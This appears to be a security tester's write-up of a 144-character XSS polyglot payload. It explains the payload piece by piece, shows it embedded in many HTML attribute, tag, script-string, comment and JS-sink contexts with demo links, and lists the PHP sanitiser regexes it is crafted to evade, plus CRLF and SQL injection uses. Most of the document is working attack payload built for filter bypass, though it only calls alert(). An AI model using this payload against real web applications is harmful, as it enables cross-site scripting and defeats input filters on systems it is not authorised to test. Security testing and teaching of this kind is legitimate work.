
## Foreground:
When it comes to testing for cross-site scripting vulnerabilities (a.k.a. XSS), you’re generally faced with a variety of injection contexts where each of which requires you to alter your injection payload so it suites the specific context at hand. This can be too tedious and time consuming in most cases, but luckily, XSS polyglots can come in handy here to save us a lot of time and effort.

***

## What is an XSS polyglot?
An XSS polyglot can be generally defined as any XSS vector that is executable within various injection contexts in its raw form.

## So, what polyglot you came up with?
```javascript

jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e

```

## Anatomy of the polyglot (in a nutshell):
* `jaVasCript:`: A label in ECMAScript; a URI scheme otherwise.
* ```/*-/*`/*\`/*'/*"/**/```: A multi-line comment in ECMAScript; a literal-breaker sequence.
* `(/* */oNcliCk=alert() )`: A tangled execution zone wrapped in invoking parenthesis!
* `//%0D%0A%0D%0A//`: A single-line comment in ECMAScript; a double-CRLF in HTTP response headers.
* `</stYle/</titLe/</teXtarEa/</scRipt/--!>`: A sneaky HTML-tag-breaker sequence.
* `\x3csVg/<sVg/oNloAd=alert()//>\x3e`: An innocuous svg element!!

__Total length: 144 characters.__

## What injection contexts does it cover?
#### HTML contexts covered:
* __Double-quoted tag attributes:__
```html
<input type="text" value="

jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e

"></input>
```
_Demo: <https://jsbin.com/dopepi>_

* __Single-quoted tag attributes:__
```html
<input type='text' value='

jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e

'></input>
```
_Demo: <https://jsbin.com/diwedo>_

* __Unquoted tag attributes:__
```html

<input type=text value=jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e></input>

```
_Demo: <https://jsbin.com/zizuvad>_
* __HTML-escaped unquoted tag attributes (requires a click):__
```html

<img border=3 alt=jaVasCript:/*-/*`/*\`/*&#039;/*&quot;/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\x3e>

```
_Demo: <https://jsbin.com/gopavuz>_
* __HTML-escaped "href"/"xlink:href" and "src" attribute values:__
```html
<a href="

jaVasCript:/*-/*`/*\`/*'/*&quot;/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\x3e

">click me</a>
```
_Demo: <https://jsbin.com/kixepi>_
```html
<math xlink:href="

jaVasCript:/*-/*`/*\`/*'/*&quot;/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\x3e

">click me</math>
```
_Demo: <https://jsbin.com/bezofuw>_
```html
<iframe src="

jaVasCript:/*-/*`/*\`/*&#039;/*&quot;/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\x3e

"></iframe>
```
_Demo: <https://jsbin.com/feziyi>_
* __HTML comments:__
```html
<!--

jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e

-->
```
_Demo: <https://jsbin.com/taqizu>_
* __Arbitrary common HTML tags:__
```html
<title>

jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e

</title>
```
_Demo: <https://jsbin.com/juzuvu>_
```html
<style>

jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e

</style>
```
_Demo: <https://jsbin.com/qonawa>_
```html
<textarea>

jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e

</textarea>
```
_Demo: <https://jsbin.com/mecexo>_
```html
<div>

jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e

</div>
```
_Demo: <https://jsbin.com/wuvumuh>_
#### Script contexts covered:
* __Double-quoted strings:__
```javascript

var str = "jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e";

```
_Demo: <https://jsbin.com/coteco>_
* __Single-quoted strings:__
```javascript

var str = 'jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e';

```
_Demo: <https://jsbin.com/segomo>_
* __Template strings/literals (ES6):__
```javascript

String.raw`jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e`;

```
_Demo: <https://jsbin.com/rewapay>_
* __Regular expression literals:__
```javascript

var re = /jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e/;

```
_Demo: <https://jsbin.com/zepiti>_
* __Single-line and multi-line comments:__
```html
<script>

//jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e

</script>
```
_Demo: <https://jsbin.com/fatorag>_
```html
<script>
/*

jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e

*/
</script>
```
_Demo: <https://jsbin.com/vovogo>_

##### JS sinks:
* __`eval`:__
````javascript

eval(location.hash.slice(1));

````
_Demo: [https://jsbin.com/qejisu#jaVasCript:/*-/*%60/*%5C%60/*'/*%22/**/(/*%20*/oNcliCk=alert()%20)//%250D%250A%250D%250A//%3C/stYle/%3C/titLe/%3C/teXtarEa/%3C/scRipt/--!%3E%3CsVg/%3CsVg/oNloAd=alert()//%3E](https://jsbin.com/qejisu#jaVasCript:/*-/*%60/*%5C%60/*'/*%22/**/(/*%20*/oNcliCk=alert()%20)//%250D%250A%250D%250A//%3C/stYle/%3C/titLe/%3C/teXtarEa/%3C/scRipt/--!%3E%3CsVg/%3CsVg/oNloAd=alert()//%3E)_

* __`setTimeout`:__
````javascript

setTimeout(location.search.slice(1));

````
_Demo: [https://jsbin.com/qawusa?jaVasCript:/*-/*%60/*%5C%60/*'/*%22/**/(/*%20*/oNcliCk=alert()%20)//%250D%250A%250D%250A//%3C/stYle/%3C/titLe/%3C/teXtarEa/%3C/scRipt/--!%3E%3CsVg/%3CsVg/oNloAd=alert()//%3E](https://jsbin.com/qawusa?jaVasCript:/*-/*%60/*%5C%60/*'/*%22/**/(/*%20*/oNcliCk=alert()%20)//%250D%250A%250D%250A//%3C/stYle/%3C/titLe/%3C/teXtarEa/%3C/scRipt/--!%3E%3CsVg/%3CsVg/oNloAd=alert()//%3E)_

* __`setInterval`:__
````javascript

setInterval(location.search.slice(1));

````
_Demo: [https://jsbin.com/colese?jaVasCript:/*-/*%60/*%5C%60/*'/*%22/**/(/*%20*/oNcliCk=alert()%20)//%250D%250A%250D%250A//%3C/stYle/%3C/titLe/%3C/teXtarEa/%3C/scRipt/--!%3E%3CsVg/%3CsVg/oNloAd=alert()//%3E](https://jsbin.com/colese?jaVasCript:/*-/*%60/*%5C%60/*'/*%22/**/(/*%20*/oNcliCk=alert()%20)//%250D%250A%250D%250A//%3C/stYle/%3C/titLe/%3C/teXtarEa/%3C/scRipt/--!%3E%3CsVg/%3CsVg/oNloAd=alert()//%3E)_

* __`Function`:__
````javascript

new Function(location.search.slice(1))();

````
_Demo: [https://jsbin.com/hizemi?jaVasCript:/*-/*%60/*%5C%60/*'/*%22/**/(/*%20*/oNcliCk=alert()%20)//%250D%250A%250D%250A//%3C/stYle/%3C/titLe/%3C/teXtarEa/%3C/scRipt/--!%3E%3CsVg/%3CsVg/oNloAd=alert()//%3E](https://jsbin.com/hizemi?jaVasCript:/*-/*%60/*%5C%60/*'/*%22/**/(/*%20*/oNcliCk=alert()%20)//%250D%250A%250D%250A//%3C/stYle/%3C/titLe/%3C/teXtarEa/%3C/scRipt/--!%3E%3CsVg/%3CsVg/oNloAd=alert()//%3E)_

* __`innerHTML`/`outerHTML` and `document.write` with HTML-escaped strings:__
```javascript

var data = "jaVasCript:/*-/*`/*\`/*&#039;/*&quot;/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\x3e";
document.documentElement.innerHTML = data;

```
_Demo: <https://jsbin.com/nimokaz>_

```javascript

var data = "jaVasCript:/*-/*`/*\`/*&#039;/*&quot;/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\x3e";
document.head.outerHTML = data;

```
_Demo: <https://jsbin.com/yowivo>_

```javascript

var data = "jaVasCript:/*-/*`/*\`/*&#039;/*&quot;/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\x3e";
document.write(data);
document.close();

```
_Demo: <https://jsbin.com/ruhofi>_

## Filter evasion:
As you might have already noticed, the polyglot has been crafted with filter evasion in mind. For instance:

* `jaVasCript:`, `oNcliCk`, et al. bypasses: 
```php
preg_replace('/\b(?:javascript:|on\w+=)/', '', payload);
```

* ``` /*`/*\` ``` bypasses: 
```php
preg_replace('/`/', '\`', payload);
```

* ``` </stYle/</titLe/</teXtarEa/</scRipt/--!> ``` bypasses: 
```php
preg_replace('<\/\w+>', '', payload);
```

* `--!>` bypasses: 
```php
preg_replace('/-->/', '', payload);
```

* ``` <sVg/oNloAd=alert()//> ``` bypasses:
```php
preg_replace('<\w+\s+', '', payload);
```

## Bonus attacking contexts covered:
#### CRLF-based cross site scripting:
````http

HTTP/1.1 200 OK
Date: Sun, 01 Mar 2016 00:00:00 GMT
Content-Type: text/html; charset=utf-8
Set-Cookie: x=jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//

//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e

````
#### Error-based SQL injections (yes, SQLi!):
````sql

SELECT * FROM Users WHERE Username='jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e'

````
````sql

SELECT * FROM Users WHERE Username="jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e"

````

###### And even more; eish...I'm tired counting down already!!